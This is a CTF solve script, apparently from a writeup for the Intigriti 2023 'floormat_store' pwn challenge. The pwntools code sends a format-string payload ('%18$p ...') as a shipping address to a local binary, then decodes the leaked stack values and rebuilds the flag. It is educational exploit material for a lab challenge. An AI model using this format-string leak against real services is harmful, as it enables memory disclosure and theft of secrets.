[OFFICIAL WRITEUP](https://book.cryptocat.me/ctf-writeups/2023/intigriti/pwn/floormat_store)

#### solve.py

```py
from pwn import *

# Connect to server
io = process('./floormats')

flag = ''

io.sendlineafter(b'Enter your choice:\n', b'6')
io.sendlineafter(b'Please enter your shipping address:\n',
                 b'%18$p %19$p %20$p %21$p')
io.recvuntil(b'Your floor mat will be shipped to:\n\n')

response = io.recv(1000)

# Split response by spaces
for i, p in enumerate(response.split(b' ')):
    try:
        if not b'nil' in p:
            try:
                # Decode, reverse endianess and print
                decoded = unhex(p.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(i) + ": " + str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException as e:
                pass
    except EOFError:
        pass

# Print and close
info(flag)
io.close()
```
